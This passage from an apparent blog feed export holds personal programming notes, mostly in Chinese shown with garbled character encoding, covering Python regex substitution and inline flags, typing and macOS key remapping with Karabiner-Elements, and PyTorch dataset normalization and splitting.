replacement_pattern = <span class="string">r&#x27;**USD \g&lt;value&gt;**&#x27;</span></span><br><span class="line"></span><br><span class="line">    text = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Widget Unit cost: 12,000.56 dollars</span></span><br><span class="line"><span class="string">Taxes: 234.00 dollars</span></span><br><span class="line"><span class="string">Total: 12,234.56 dollars&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Pattern: &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(pattern))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;---Text:\n&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(text))</span><br><span class="line">    <span class="comment">#successful match</span></span><br><span class="line">    new_text = re.sub(pattern, replacement_pattern, text)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;---New Text:\n&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(new_text))</span><br></pre></td></tr></table></figure><h2 id="inline-option">inline option</h2><p>[python re inlineoption](https://docs.python.org/3/library/re.html#:~:text=currently%20supported%20extensions.-,(%3FaiLmsux),-(One%20or%20more)</p><p><code>(?aiLmsux)</code></p><p>re æ¨¡å—å¯ä»¥ä½¿ç”¨ flag ä¼ å‚, æˆ–è€…ç›´æ¥ä½¿ç”¨ inline option</p><p><code>i</code>: å¤§å°å†™ <code>a</code>: ascii ç  only</p><p>ä¾‹å¦‚:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(?i)d</span><br><span class="line">åŒ¹é…:</span><br><span class="line">Don&#x27;t d</span><br></pre></td></tr></table></figure><h2 id="single-characters">Single Characters</h2><h3 id="negate-the-whole-range-with">Negate the whole range with ^</h3><ul><li>Problem: Find all occurrence of characters NOT in(a,b,c,d,x,y,z,0,1,2,3)</li><li>Pattern: <code>[^a-dx-z0-3]</code></li></ul><h3 id="escape-character">Escape Character<br /></h3><ul><li>Problem: Find all occurrence of <code>.</code>(dot)</li><li>Patternï¼š<code>\.</code></li><li>Text: This. is. a text</li></ul><h3id="control-charactertab-newline-carriage-return-and-so-forth">Controlcharacter(tab, newline, carriage return and so forth)</h3><ul><li>Problem: Find all occurrences of tab</li><li>Pattern: </li><li>text: One tab. Two tebs</li></ul><h3 id="set-negation">Set-Negation</h3><ul><li>Problem: Find all occurrence of characters that NOT vowels</li><li>Pattern: <code>[^aeiou]</code></li><li>Text: this is ^ a big test</li></ul><p><code>[^set]</code>: Not in that set, åªè¦åœ¨å¼€å¤´åŠ äº† ^,é‚£ä¹ˆè¿™ä¸ªé›†åˆå°±éƒ½æ˜¯ä¸åŒ…å«çš„é›†åˆ</p><p>ä¾‹å¦‚:<code>[^ae^iou]</code>, åŒ¹é…:<strong>T</strong>i<strong>g</strong></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typing, keyboard positions and modifications</title>
      <link href="/blog/2023/02/16/misc/typing_keybroad/"/>
      <url>/blog/2023/02/16/misc/typing_keybroad/</url>
      
        <content type="html"><![CDATA[<p>ç›²æ‰“ï¼Œè¿™ä»¶äº‹è‡ªå·±ä»¿ä½›ä¹Ÿæ²¡æ€ä¹ˆç»ƒä¹ è¿‡ï¼Œæ‰“èµ·å­—æ¥ä¹Ÿä¸è®°å¾—çœ‹ä¸çœ‹é”®ç›˜ï¼Œä½†æ˜¯è®©è‡ªå·±å®Œå…¨ç›²æ‰“åˆä¸æ˜¯é‚£ä¹ˆç¡®å®šã€‚</p><p>æ›¾ç»å¼€å§‹è®¤çœŸç»ƒä¹ è¿‡ä¸€æ¬¡ï¼Œåé¢æœ‰äº‹æƒ…å°±å¿˜äº†ï¼Œæœ€è¿‘æ•´äº†ä¸ªè“ç‰™é”®ç›˜ï¼Œåˆçœ‹äº†çœ‹æ‰“å­—ï¼Œè¿™ä¸€æ¬¡çªç„¶æ˜ç™½ä¸ºä»€ä¹ˆæ€»æ˜¯å­¦ä¸ä¼šæ‰“å­—äº†ã€‚</p><p>æˆ–è®¸è¿™å°±æ˜¯å¥‘æœºå§ï¼Œå¼ºè¿«ç€ï¼Œå°±ä¼šäº† ğŸ˜„</p><p>Recommended website for Typing Practiceï¼Œæˆ‘ä¸»è¦æ˜¯ç”¨å‰ä¸¤ä¸ª:</p><ol type="1"><li><ahref="https://www.typing.com/student/lesson/360/u-r-and-k-keys">TypingLessons | U, R, and K Keys - Typing.com</a></li><li><ahref="https://www.typingclub.com/sportal/program-3.game">edclub</a></li><li><ul class="task-list"><li><label><input type="checkbox" /><a href="https://typing.io/">TypingPractice for Programmers | typing.io</a></label></li></ul></li></ol><h2 id="å…³äºé”®ç›˜ä¸æ‰“å­—">å…³äºé”®ç›˜ä¸æ‰“å­—</h2><ol type="1"><li><p>é”®ç›˜çš„é—®é¢˜ï¼Œç›®å‰æµè¡Œçš„é”®ç›˜å¸ƒå±€æœ¬èº«å°±æ˜¯ä¸é€‚åˆä¸­æ–‡æ‰“å­—ï¼Œè€Œè‡ªå·±åˆæœ‰æ—¶å€™ä¸­è‹±æ··æ‰“ï¼Œæ›´åŠ éº»çƒ¦ã€‚</p><ol type="1"><li>ç›®å‰çš„ qwertyå¸ƒå±€é”®ç›˜å®é™…ä¸Šæ˜¯ä¸ªå†å²é—ç•™é—®é¢˜ï¼Œä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é”®ç›˜å¸ƒå±€ï¼Œåªæ˜¯å•†ä¸šæ¨å¹¿ï¼Œä½¿ç”¨ä¹ æƒ¯ï¼Œç§¯é‡éš¾è¿”ç½¢äº†ã€‚ä¾‹å¦‚å¤§é”®ç›˜çš„æ•°å­—é”®ç›˜åŒºå°±æ˜¯å½“æ—¶å¯¹æ•°å­—çš„å¤„ç†éœ€æ±‚å¢å¤§ï¼Œå› æ­¤å•ç‹¬è®¾ç½®å‡ºæ¥ï¼Œæ–¹ä¾¿ä½¿ç”¨çš„ã€‚</li><li>é”®ç›˜å¸ƒå±€æ˜¯ä¸º alphabet-based language, ä¾‹å¦‚è‹±è¯­ç­‰è®¾è®¡çš„ï¼Œè€Œä¸­æ—¥éŸ©ç­‰character-based languageéœ€è¦åœ¨æ­¤åŸºç¡€ä¸Šå¤šä¸€æ­¥æ•°å­—é”®ç›˜é€‰å­—çš„æ­¥éª¤ï¼Œè¿™å°±å–å†³äºä½ ç”¨çš„ä¸­æ–‡è¾“å…¥æ³•çš„æ¨èå‡†ç¡®åº¦äº†ã€‚</li><li>ç›²æ‰“æŒ‡æ³•æ˜¯è®¾è®¡ç”¨æ¥æ­£å¸¸è¾“å…¥è‹±è¯­æ–‡å­—çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å‡»æ‰“ tab caps shiftctrl alt [] ;'/ï¼Œè€Œ 99%çš„æ—¶é—´éƒ½åº”è¯¥åœ¨å‡»æ‰“ä¸»é”®åŒºã€‚<strong>æƒ³ç”¨æ¥å†™ä»£ç ï¼Œåˆæˆ–è€…æ‰“ä¸­æ–‡éœ€è¦ç”¨æ•°å­—é”®é€‰è¯çš„åœºæ™¯ï¼Œéƒ½ä¸æ˜¯ç›²æ‰“æŒ‡æ³•é€‚ç”¨çš„åœºæ™¯ã€‚</strong></li></ol></li><li><p>è¯´å®è¯ï¼Œæ‰“å­—é€Ÿåº¦æ—©å°±ä¸æ˜¯ç”Ÿäº§åŠ›çš„åˆ¶çº¦è€…äº†ï¼Œç°åœ¨å†™ä»£ç å¤§éƒ¨åˆ†éƒ½æ˜¯è¡¥å…¨ï¼Œçº¯æ‰‹æ‰“çš„éƒ¨åˆ†æœ‰å¤§éƒ¨åˆ†éƒ½æ˜¯å›ºå®šçš„å•è¯ï¼ˆpublic static void main)ï¼Œå‰©ä¸‹çš„è¿˜æœ‰å¤šå°‘ï¼Ÿ</p></li></ol><p>å› ä¸ºä»£ç ä¸­å«æœ‰å¾ˆå¤šå³æ‰‹å°æ‹‡æŒ‡è´Ÿè´£çš„ç¬¦å·ï¼Œå› æ­¤æœ¬æ¥æ˜¯éå¸¸å›°éš¾çš„ï¼Œä½†æ˜¯ç›®å‰å†™ä»£ç å¤§éƒ¨åˆ†éƒ½æ˜¯è‡ªåŠ¨è¡¥å…¨äº†ï¼Œçº¯æ‰‹æ‰“çš„éƒ¨åˆ†éƒ½æ˜¯ä¸€äº›å›ºå®šçš„å•è¯ï¼ˆpublic void int mainï¼‰ä¹‹ç±»çš„ï¼Œæ‰€ä»¥æ–¹ä¾¿å¤šäº†ã€‚</p><p>è™½ç„¶ä½†æ˜¯ï¼Œåœ¨æ²¡æœ‰è¡¥å…¨çš„ç¼–è¾‘å™¨ï¼Œåœºåˆä¸­ï¼Œæˆ‘å³æ‰‹å°æ‹‡æŒ‡ç›²æ‰“ç¬¦å·è¿˜æ˜¯éœ€è¦ç»§ç»­ç»ƒä¹ ã€‚</p><h2 id="é”®ä½ä¿®æ”¹">é”®ä½ä¿®æ”¹</h2><p>macOS ä¸Šå¯ä»¥ä½¿ç”¨ karabiner-Elements ä¿®æ”¹è½¯ä»¶é”®ä½ã€‚</p><h3 id="command-cv">command + c/v</h3><p>å¦‚æœæŒ‰ç…§é”®ä½çš„è¯ï¼Œå¯¹äº macOS ç”¨æˆ·ï¼ŒCmd ï¼ˆ Altï¼‰ç”¨æ— åæŒ‡æ¥æŒ‰çš„è¯ï¼Œå¿«æ·é”®åŸºæœ¬ä¸Šæ‰“èµ·æ¥å¾ˆä¸èˆ’æœ</p><p>ä¸ªäººæ‰“å­—å–œå¥½ï¼šCTRL+C çš„æ—¶å€™ç”¨å·¦æ‰‹é£ŸæŒ‡æŒ‰ Cã€‚å¯¹ Windowsé”®ç›˜è€Œè¨€ï¼ŒCTRL+C çš„æ—¶å€™ä¹ æƒ¯å°æ‹‡æŒ‡ ctrl + é£ŸæŒ‡ cvï¼Œ å¯¹ macOSé”®ç›˜è€Œè¨€ï¼Œå¤åˆ¶æ˜¯ left Command + C ï¼Œ å·¦æ‰‹å¤§æ‹‡æŒ‡ command é…åˆå·¦æ‰‹é£ŸæŒ‡cï¼Œv</p><p>å·¦æ‰‹çš„é£ŸæŒ‡å’Œä¸­æŒ‡æŒ‰ C çœ‹è‡ªå·±ä¹ æƒ¯ï¼Œæˆ‘ä¸€å¼€å§‹è§‰å¾—å·¦æ‰‹é£ŸæŒ‡æŒ‰ cæœ€æ–¹ä¾¿çš„ï¼Œè‡ªç„¶,æ¯”ä¸­æŒ‡çµæ´»ï¼Œæ‰‹æŒ‡å‘ä¸‹è½»å¾®ä¸€æ»‘å°±åˆ°ä½ç½®äº†ã€‚åé¢ç»ƒç€ç»ƒç€ä¸­æŒ‡ä¹Ÿçµæ´»ä¸€äº›äº†ï¼Œä¸­æŒ‡æŒ‰cä¹Ÿå¯ä»¥äº†ã€‚æ€»ä¹‹ä¹ æƒ¯å°±å¥½ï¼Œæ„Ÿè§‰é”®ç›˜çš„æŒ‡æ³•åªæ˜¯åšäº†ä¸€ä¸ªåˆ†å·¥ï¼Œé€‚åˆè‡ªå·±æ‰æœ€å¥½ã€‚</p><p>å­—æ¯ b å·¦æ‰‹é£ŸæŒ‡ï¼Œå³æ‰‹é£ŸæŒ‡éƒ½å¯ä»¥ï¼ŒBæœ¬æ¥å°±ç¦»ä¸¤æ‰‹é£ŸæŒ‡ä¸€æ ·è·ç¦»ï¼Œè°ç®¡éƒ½ä¸€æ ·</p><h3 id="å³è¾¹åŠŸèƒ½é”®">å³è¾¹åŠŸèƒ½é”®</h3><p>QWERTYé”®ç›˜å¸ƒå±€å¯¹å°æŒ‡çš„è¦æ±‚å¤ªé«˜äº†ã€‚æŒ‰ç…§æ ‡å‡†æŒ‡æ³•ï¼Œå¾€å¾€å¾ˆå¤šäººçš„å°æŒ‡å¤ªçŸ­å¤Ÿä¸åˆ°ï¼Œæ‰¾åˆ°é€‚åˆè‡ªå·±çš„å°±è¡Œï¼ŒåŸåˆ™å°±æ˜¯å°½é‡å°‘ç§»åŠ¨æ‰‹æŒé¿å…åŠ³ç´¯</p><p>æˆ‘å­—æ¯é”®ã€æ•°å­—é”®ã€å·¦è¾¹åŠŸèƒ½é”®åŸºæœ¬ä¸Šæ˜¯æ ‡å‡†æŒ‡æ³•ï¼Œä½†æ˜¯ Fé”®åŒºå’Œå³è¾¹åŠŸèƒ½é”®å’Œé€€æ ¼é”®å¤ªè¿œäº†ã€‚ä¸€èˆ¬æœ‰ä¸¤ç§å¤„ç†æ–¹å¼ï¼š</p><ol type="1"><li><p>æ›´æ¢é”®ä½ï¼ŒæŠŠå³è¾¹å¸¸ç”¨çš„é”®æ¢åˆ°å·¦è¾¹ï¼Œä¾‹å¦‚é€€æ ¼é”®æ¢åˆ° Caps lockï¼š</p><ol type="1"><li><strong>Caps Lock é”®æ¢ä¸ºå•ç‹¬æŒ‰æ—¶ä¸º delete and backspaceï¼Œå¦åˆ™ä¸ºControl</strong>ï¼Œéå¸¸æ–¹ä¾¿ã€‚</li></ol></li><li><p>ä¸€èˆ¬éƒ½æ˜¯æ‰‹éƒ¨æ•´ä¸ªç§»åŠ¨å»æŒ‰çš„</p></li></ol><h3 id="ä¸Šæ’çš„æ•°å­—é”®">ä¸Šæ’çš„æ•°å­—é”®</h3><p>ç›®å‰æˆ‘é‡‡å–çš„æ–¹æ³• 2</p><ol type="1"><li><p>å¯ä»¥å°†æ•°å­—é”®æ˜ å°„åˆ°å­—æ¯åŒºåŸŸï¼Œé€šè¿‡ä¿®æ”¹é”®ä½å’Œç»„åˆé”®çš„æ–¹å¼å®ç°ã€‚</p><p><ahref="https://github.com/pqrs-org/Karabiner-Elements/issues/127">FN +[789uiojkl] -&gt; NumPad support? Â· Issue #127 Â·pqrs-org/Karabiner-Elements</a></p></li><li><p>å­¦ä¹ æ•´ä¸ªæ‰‹æŒç§»åŠ¨ä¸å½’ä½</p></li></ol><h3 id="æ–¹å‘é”®">æ–¹å‘é”®</h3><p>ä¿®æ”¹æˆ vim çš„é”®ä½ï¼Œcontrol + hjkl æ§åˆ¶å·¦å³ä¸Šä¸‹ã€‚ left arrow ischanged to control+h, right arrow is changed to control+l, ç»“åˆä¹‹å‰å°†Caps lock ä¸åˆ«çš„é”®ä¸€èµ·æŒ‰ä¸‹æ—¶ä¿®æ”¹ä¸ºäº† controlï¼Œå°±å¯ä»¥æŒ‰ caps lock å’Œ hjklå®ç°å·¦ä¸‹ä¸Šå³äº†ã€‚</p><h2 id="åˆ‡æ¢-workspace-å¿«æ·é”®">åˆ‡æ¢ workspace å¿«æ·é”®</h2><p>åœ¨ mac çš„ Mission control ä¸­ä¿®æ”¹åˆ‡æ¢ space çš„å¿«æ·é”®ï¼Œæ”¹æˆäº† command +left arrow, command + right arrow.</p><p>è€Œ left arrow is changed to control+h, right arrow is changed tocontrol+l, å› æ­¤å®é™…ä¸Šå°±æ˜¯ Ctrl+Alt(Command) +h(å·¦)/j(ä¸‹,Linux)/k(ä¸Š,Linux)/l(å³)ï¼Œç»å¸¸ä½¿ç”¨ä¸¤ä¸ªç³»ç»Ÿï¼ˆmac å’Œlinuxï¼‰æ—¶æ“ä½œä¹Ÿæ–¹ä¾¿è®¸å¤šã€‚</p><p>å½“ç„¶ï¼Œè¿™æ˜¯åœ¨å°† caps æ¢æˆ backspace when alone pressed, otherwise leftcontrol çš„æƒ…å†µä¸‹ã€‚</p><h2 id="ç½‘é¡µæµè§ˆå¿«æ·é”®">ç½‘é¡µæµè§ˆå¿«æ·é”®</h2><ol type="1"><li>æ›´å¤§å¹…åº¦çš„æ»‘åŠ¨ç½‘é¡µï¼š Option + æ–¹å‘ç®­å¤´</li><li>å‘ä¸‹æ»‘åŠ¨ä¸€æ•´é¡µï¼š ç©ºæ ¼</li><li>å‘ä¸Šæ»‘åŠ¨ä¸€æ•´é¡µï¼š Shift + ç©ºæ ¼</li></ol><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://www.v2ex.com/t/891131">çªç„¶å‘ç°è‡ªå·±ä¸€ç›´ä»¥é”™è¯¯çš„æ–¹å¼æ‰“å­— -V2EX</a></li><li><ahref="https://baijiahao.baidu.com/s?id=1719024120788253466&amp;wfr=spider&amp;for=pc&amp;searchword=%E4%B8%BA%E4%BB%80%E4%B9%88%E6%A0%87%E5%87%86%E9%94%AE%E7%9B%98%E9%94%AE%E4%BD%8D%E5%9E%83%E5%9C%BE%20%E4%B8%8D%E6%8D%A2">é”®ç›˜ä¸Šå¤šä½™çš„æŒ‰é”®ï¼Œæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</a></li><li><a href="https://www.zhihu.com/question/21079800">æ€æ ·åœ¨ Macç³»ç»Ÿä¸‹é€šè¿‡å¿«æ·é”®å¿«é€Ÿåˆ‡æ¢æ¡Œé¢ï¼Ÿ - çŸ¥ä¹</a></li><li><ahref="https://ke-complex-modifications.pqrs.org/?q=Left%20ctrl%20%2B%20hjkl%20to%20arrow%20keys%20Vim">Karabiner-Elementscomplex_modifications rules</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>torch dataset ç›¸å…³å‡½æ•°</title>
      <link href="/blog/2023/02/15/programming/python/pytorch/torch_dataset/"/>
      <url>/blog/2023/02/15/programming/python/pytorch/torch_dataset/</url>
      
        <content type="html"><![CDATA[<p>ä»¥ MNIST ä¸¾ä¾‹,</p><ul><li><code>train_dataset.data</code> è·å¾— feature/image çš„ tensorï¼Œ å…¶shape ä¸º <code>torch.Size([60000, 28, 28])</code></li><li><code>train_dataset.targets</code> è·å¾— label çš„ tensorï¼Œå…¶ shape ä¸º<code>torch.Size([60000])</code></li><li><code>train_dataset[0]</code> è·å¾—äºŒå…ƒç»„(image,label)è¡¨ç¤ºç¬¬ä¸€æ¡è®°å½•</li><li><code>train_dataset[0][0]</code>ï¼Œ<code>train_dataset[0][1]</code>åˆ†åˆ«ä¸ºç¬¬ä¸€æ¡æ•°æ®çš„ image å’Œ label å¯¹åº”çš„ tensor</li></ul><h2 id="æ•°æ®é›†ç‹¬ç«‹åŒåˆ†å¸ƒ">æ•°æ®é›†ç‹¬ç«‹åŒåˆ†å¸ƒ</h2><p>MINST æ•°æ®ç‹¬ç«‹åŒåˆ†å¸ƒå’Œéç‹¬ç«‹åŒåˆ†å¸ƒçš„ä»£ç ï¼š</p><p><ahref="https://www.kaggle.com/code/melikedograr0/mnist-dataset-distributed-as-iid-non-iid">MNISTdataset distributed as IID &amp; Non-IID | Kaggle</a></p><p>MNIST æ•°æ®é›†ä¸­å„ç±»åˆ«æ•°ç›®ä¸æ¯”ä¾‹ï¼š<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/mnist_percentage.png"alt="Class percentages in MNIST dataset" /> from paper: <ahref="https://www.researchgate.net/publication/320761896">A MinimalSubset of Features Using Feature Selection for Handwritten DigitRecognition</a></p><h2 id="normalize-dataset">Normalize dataset</h2><p>å½’ä¸€åŒ–çš„ç›®çš„å°±æ˜¯ä½¿å¾—é¢„å¤„ç†çš„æ•°æ®è¢«é™å®šåœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼ˆæ¯”å¦‚ [0,1] æˆ–è€…[-1,1]ï¼‰ï¼Œä»è€Œæ¶ˆé™¤å¥‡å¼‚æ ·æœ¬æ•°æ®å¯¼è‡´çš„ä¸è‰¯å½±å“ã€‚</p><p>å¥‡å¼‚æ ·æœ¬æ•°æ®æ˜¯æŒ‡ç›¸å¯¹äºå…¶ä»–è¾“å…¥æ ·æœ¬ç‰¹åˆ«å¤§æˆ–ç‰¹åˆ«å°çš„æ ·æœ¬çŸ¢é‡ï¼ˆå³ç‰¹å¾å‘é‡ï¼‰</p><p>ä¾‹å¦‚ï¼šage ç‰¹å¾ä¸€èˆ¬èŒƒå›´ [0, 100], å·¥èµ„ç‰¹å¾ä¸€èˆ¬èŒƒå›´ï¼š[2000, 6000],é‚£ä¹ˆé‡‡ç”¨æ¢¯åº¦ä¸‹é™æ³•è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œå¯»æ‰¾æœ€ä¼˜è§£çš„æ¢¯åº¦ä¸‹é™è¿‡ç¨‹ä¸­ï¼Œè·¯å¾„å°±æœ‰å¯èƒ½è¢«å·¥èµ„ç‰¹å¾çš„å½±å“æ‰€ä¸»å¯¼ï¼Œä»è€Œå¯¼è‡´æ”¶æ•›è¿‡ç¨‹ç¼“æ…¢ï¼Œç”šè‡³æ”¶æ•›æ•ˆæœä¸å¥½ã€‚</p><p>ä¾‹å¦‚ä¸‹å›¾æŸå¤±å‡½æ•°çš„ç­‰é«˜çº¿,æœªå½’ä¸€åŒ–çš„ç‰¹å¾ä¼šå¯¼è‡´æŸå¤±å‡½æ•°çš„ç­‰é«˜çº¿å˜æˆæ¤­åœ†å½¢çŠ¶ï¼Œä»è€Œå¯¼è‡´æ¢¯åº¦ä¸‹é™æ³•æ”¶æ•›è¿‡ç¨‹ç¼“æ…¢ï¼Œç”šè‡³æ”¶æ•›æ•ˆæœä¸å¥½ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/unnormalized_data.png"alt="unnormalized_data" /><figcaption aria-hidden="true">unnormalized_data</figcaption></figure><p>å½’ä¸€åŒ–ä¹‹åï¼ŒæŸå¤±å‡½æ•°çš„ç­‰é«˜çº¿å˜æˆåœ†å½¢ï¼Œä»è€Œå¯¼è‡´æ¢¯åº¦ä¸‹é™æ³•æ”¶æ•›è¿‡ç¨‹æ›´åŠ å¹³ç¼“ï¼Œæ”¶æ•›é€Ÿåº¦åŠ å¿«ã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/normalized_data.png"alt="Normalized Data" /></p><p>æ•°æ®å½’ä¸€åŒ–æ•ˆæœï¼šæ”¶æ•›è¿‡ç¨‹æ›´åŠ å¹³ç¼“ï¼Œæ”¶æ•›é€Ÿåº¦åŠ å¿«</p><p>å¸¸è§æ•°æ®é›† mean stdï¼š</p><p>MNIST: mean, std = (0.1307,), (0.3081,) FashionMNIST: mean, std =(0.2861,), (0.3528,) CIFAR10: mean, std = (0.4914, 0.4822, 0.4465),(0.2470, 0.243, 0.261)</p><p>ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">    transforms.Normalize((0.4914, 0.4822, 0.4465),</span><br><span class="line">                            (0.2470, 0.243, 0.261)),</span><br><span class="line">])</span><br></pre></td></tr></table></figure><ol type="1"><li><p><code>torch.ToTensor()</code> å°†å›¾ç‰‡è½¬æ¢ä¸º FloatTensor</p><blockquote><p>Converts a PIL Image or numpy.ndarray (H x W x C) in the range [0,255] to a <strong>torch.FloatTensor</strong> of shape (C x H x W) in therange [0.0, 1.0], å°†æ‰€æœ‰æ•°é™¤ä»¥ 255ï¼Œå°†æ•°æ®å½’ä¸€åŒ–åˆ° [0ï¼Œ1]</p></blockquote></li><li><p><code>torch.flatten</code></p><p><code>transforms.Lambda(torch.flatten)</code> å°†æ•°æ®é›† flattenæˆä¸€ç»´</p><p><ahref="https://pytorch.org/vision/main/generated/torchvision.transforms.ToTensor.html">ToTensorâ€” Torchvision main documentation</a></p></li><li><p><code>transforms.Normalize</code></p><p>å¯¹åº” channelçš„æ•°æ®ï¼Œå‡å€¼å’Œæ ‡å‡†å·®ï¼Œè¿ç®—å¦‚ä¸‹ï¼š<code>x = (x - mean) / std</code> ç»è¿‡transforms.Normalize æ•°æ®ä¸ä¸€å®šæœä»æ­£æ€åˆ†å¸ƒ,ç»“æœä¹Ÿä¸ä¸€å®šéƒ½å¤„äº [-1,1]ä¹‹é—´</p><p>Normalize:å‡å»å‡å€¼ï¼Œé™¤ä»¥æ ‡å‡†å·®åªæ˜¯å°†æ•°æ®è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ï¼Œå¹¶ä¸ä¼šæ”¹å˜åŸå§‹æ•°æ®çš„åˆ†å¸ƒã€‚æ¯ä¸€ä¸ªchannels ä¸Šæ‰€æœ‰ batch çš„æ•°æ®æœä»å‡å€¼ä¸º 0ï¼Œæ ‡å‡†å·®ä¸º 1ã€‚</p><ol type="1"><li><a href="https://developer.aliyun.com/article/840635">æˆ‘ç”¨ PyTorchå¤ç°äº† LeNet-5 ç¥ç»ç½‘ç»œï¼ˆMNISTæ‰‹å†™æ•°æ®é›†ç¯‡ï¼‰ï¼-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº</a></li><li><ahref="https://www.cnblogs.com/silence-tommy/p/7113498.html">æœºå™¨å­¦ä¹ ç¬”è®°ï¼šä¸ºä»€ä¹ˆè¦å¯¹æ•°æ®è¿›è¡Œå½’ä¸€åŒ–å¤„ç†ï¼Ÿ- ä¸è¯´è¯çš„æ±¤å§†çŒ« - åšå®¢å›­</a></li><li><ahref="https://zhuanlan.zhihu.com/p/424518359">å¦‚ä½•ç†è§£å½’ä¸€åŒ–ï¼ˆnormalizationï¼‰?- çŸ¥ä¹</a></li><li><a href="https://zhuanlan.zhihu.com/p/414242338">pytorch ä¸­å½’ä¸€åŒ–transforms.Normalize çš„çœŸæ­£è®¡ç®—è¿‡ç¨‹ - çŸ¥ä¹</a></li></ol></li></ol><h2 id="torch-åˆ†å‰²æ•°æ®é›†-sampler-vs-subset-vs-random_split">Torchåˆ†å‰²æ•°æ®é›† sampler vs subset vs random_split</h2><ol type="1"><li><p>å¦‚æœä¸€ç›´ä¸åœä½¿ç”¨ä¸€ä¸ªæ•°æ®é›†ï¼Œä¸”éœ€è¦æ ¹æ®ç‰¹å¾ä½¿ç”¨æ•°æ®é›†çš„ä¸åŒéƒ¨åˆ†ï¼Œåˆ™ä½¿ç”¨sampler</p><p>ä¸ºäº†é¿å…é‡å¤æ€§åˆ›å»ºæ•°æ®é›†ï¼Œåªé’ˆå¯¹ä¸€ä¸ªæ•°æ®é›†åšåç»­çš„å¤„ç†çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨samplerï¼Œè€Œä¸å¿…é‡‡ç”¨ subset. You can define a custom sampler for thedataset loader avoiding recreating the dataset (just creating a newloader for each different sampling).</p></li><li><p>å®šåˆ¶åŒ–è·å–æ•°æ®é›†çš„å­é›†ï¼Œåç»­åªç”¨è¯¥å­é›† /åªä½¿ç”¨å¤§æ•°æ®é›†çš„ä¸€éƒ¨åˆ†å­é›†è®­ç»ƒ</p><p>ç›´æ¥æ ¹æ®åŸå§‹æ•°æ®é›†åˆ›å»ºä¸€ä¸ª subset å­é›†å³å¯ã€‚</p><p><ahref="https://stackoverflow.com/questions/47432168/taking-subsets-of-a-pytorch-dataset">python- Taking subsets of a pytorch dataset - Stack Overflow</a></p><p>å‚è€ƒï¼š<ahref="http://www.codebaoku.com/it-python/it-python-238136.html">Pytorchç»§æ‰¿ Subset ç±»å®Œæˆè‡ªå®šä¹‰æ•°æ®æ‹†åˆ† - ç¼–ç¨‹å®åº“</a></p><p>åŠ¨æ€å˜åŒ–æƒé‡çš„é‡‡æ ·å™¨ï¼Œ <ahref="https://github.com/pytorch/pytorch/issues/7359">[feature request][PyTorch] Dynamic Samplers. Â· Issue #7359 Â· pytorch/pytorch</a></p></li><li><p>è”é‚¦å­¦ä¹ ä¸­æœåŠ¡ç«¯å¯¹æ•°æ®é›†è¿›è¡Œåˆ†å‰²ï¼Œç„¶ååˆ†å‘ç»™ client ä»è€Œæ¨¡æ‹Ÿlocal model training with the share of dataã€‚</p><p>å¯ä»¥é‡‡ç”¨ `random_split</p><p>random_split(dataset, lengths) works directly on the dataset.</p><p>Two input arguments:</p><ol type="1"><li>The first argument is the dataset.</li><li>The second is a tuple of lengths.</li></ol><p>returns two Datasets with non-overlapping indices, which were drawnrandomly based on the passed lengths, while SubsetRandomSampler acceptsthe indices directly.</p><p>If we want to split our dataset into 2 parts, we will provide a tuplewith 2 numbers. These numbers are the sizes of the correspondingdatasets after the split.</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_dataset, val_dataset = random_split(dataset, (<span class="number">6000</span>, <span class="number">899</span>))</span><br></pre></td></tr></table></figure></p><p>It's important to note that in federated learning, both<code>random_split</code> and <code>sampler</code> can be used together,but their roles are slightly different.</p><ol type="1"><li><p><code>random_split</code> is typically used on the server side todivide the global dataset into subsets for clients</p></li><li><p>while <code>sampler</code> is used on the client side to controlthe data sampling strategy during local training</p></li></ol></li><li><p>æ•°æ®é›†æœ¬åœ°åˆ†ä»½ï¼Œç„¶åä½¿ç”¨</p><p>train_dataset è¯»å–äº†æ•°æ®é›†çš„ dataset å¯¹è±¡ã€‚</p><ol type="1"><li><p>[ä¸æ¨è] å°† tensor split æˆ K ä¸ª tensorï¼Œ</p><p><code>torch.tensor_split(train_dataset.data, K_partitions, dim=0)</code></p></li><li><p>[æ¨è] é€šè¿‡ reshape æˆ–è€… view æ¥æ”¹å˜ tensor çš„è§†å›¾</p><p><code>train_dataset.data.reshape((K_partitions, len(train_dataset)//K_partitions, -1))</code></p></li></ol></li></ol><h2 id="change-label-in-dataset">Change label in dataset</h2><p>æ¨èå¦‚ä¸‹æ–¹å¼ï¼Œå°†æ ‡ç­¾ç­‰äº 4 çš„æ ‡ç­¾è®¾ä¸º 